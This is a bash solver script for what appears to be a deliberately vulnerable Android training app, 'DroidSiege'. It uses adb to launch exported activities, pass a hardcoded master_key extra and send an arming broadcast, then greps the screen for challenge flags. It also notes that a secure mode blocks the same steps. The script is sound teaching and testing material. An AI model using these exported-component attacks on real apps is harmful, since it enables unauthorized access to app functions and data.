#!/usr/bin/env bash
# DroidSiege — components/exported tooling pack
# Drives every exported component tier from adb.
set -euo pipefail

echo "== L1: launch the exported portal =="
adb shell am start -n com.droidsiege/.challenges.components.ExportFlagActivity
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_exported_L1" || true

echo
echo "== L2: craft the master_key extra =="
adb shell am start -n com.droidsiege/.challenges.components.KeyedExportActivity \
  --es master_key siege-master-key-2026
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_exported_L2" || true

echo
echo "== L3: message the exported Messenger service (bind from any client) =="
echo "intended client (see write-up): bindService + Messenger, msg.what=1," \
  "reply bundle key=recovery. Secure builds validate the uid instead."

echo
echo "== L4: arm the chain, then open the escrow activity =="
adb shell am broadcast -a com.droidsiege.CHAIN_ARM --ez arm true
adb shell am start -n com.droidsiege/.challenges.components.ChainActivity
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_exported_L4" || true

echo
echo "== secure-mode check: same commands render ACCESS_DENIED =="
echo "toggle secure mode (Settings or the challenge screen) and re-run"
